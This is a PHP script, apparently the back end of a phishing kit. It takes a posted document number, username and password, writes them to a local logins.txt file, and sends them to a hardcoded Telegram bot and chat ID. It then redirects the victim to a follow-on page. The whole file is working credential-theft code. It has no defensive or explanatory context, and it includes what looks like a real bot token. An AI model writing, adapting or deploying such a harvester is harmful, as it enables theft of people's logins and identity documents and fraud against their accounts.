<?php
session_start();

$DocumentNumber = $_POST['DocumentNumber'];
$UserName = $_POST['UserName'];
$Password = $_POST['Password'];


$fp = fopen("logins.txt", "a+");
fwrite($fp, "\n");
fwrite($fp, "
DNI: $DocumentNumber 
USER: $UserName  
SENHA: $Password");

fwrite($fp, "\n");
fwrite($fp, "");
fwrite($fp, "\n");

fclose($fp);
 $mensage =
        "------------ DADOS ------------\n
            DNI: $DocumentNumber
            USUARIO: $UserName
            SENHA: $Password
            ------------ by: shellby -------------
            ";
    
    $encoded = urlencode($mensage);
    
    $telegramBotApiKey = "6052493092:AAGKeW6jxmtw7YH6hW8bQbfdrMwVZUazvrA-NuQb4"; //ID/TOKEN BOT AQUI
    $telegramChatID = "5974603335"; //ID CHAT/Canal
    
    $url3 = "https://api.telegram.org/bot{$telegramBotApiKey}/sendMessage?chat_id={$telegramChatID}&text={$encoded}";
    
    $opts = array('http' =>
        array(
            'method'  => 'POST',
            'header'  => 'Content-type: application/x-www-form-urlencoded',
        )
    );
    $context  = stream_context_create($opts);
    $result = file_get_contents($url3, false, $context);

header('Location: ./gestion/ingresar-du.php');

?>